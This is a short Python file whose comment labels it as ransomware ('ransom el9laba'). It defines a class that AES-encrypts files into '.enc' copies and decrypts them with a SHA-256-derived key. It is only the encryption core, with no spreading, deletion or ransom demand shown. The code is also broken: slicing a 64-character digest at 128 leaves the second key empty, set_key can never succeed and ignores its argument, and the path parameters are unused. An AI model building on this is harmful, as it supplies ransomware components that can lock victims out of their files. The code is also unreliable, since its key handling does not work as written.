import pyAesCrypt as aes
import os
import hashlib 
from hashlib import sha256
import rsa

# ransom el9laba
class EN():
    def __init__(self,key:str):
        # user cannot surely know the key
        self.key=str(sha256(key.encode('utf-8')).hexdigest())[0:128]
        self.second_key=str(sha256(key.encode('utf-8')).hexdigest())[128:]
        return

    def encrypt(self,path:str,source:str)->str:
        output = source + ".enc"
        k = self.key
        aes.encryptFile(source, output, k)
        return output

    def decrypt(self,path:str,source:str):
        df = source.split(".")
        #output = df[0]+ "dec."+df[1]
        if len(df)==1:  #linux format
            output = df[0]
        else:
            output = df[0]+ "."+df[1]
        aes.decryptFile(source, output, self.key)
        return
    
    def set_key(self,new_key:str):
        k = str(input("Enter old key please"))
        hk = str(sha256(k.encode('utf-8')).hexdigest())[128:]
        if self.key == hk:
            self.key = hk
        else:
            print("Wrong!")
            #k = str(input("Enter old key please"))
            # set_key(k)

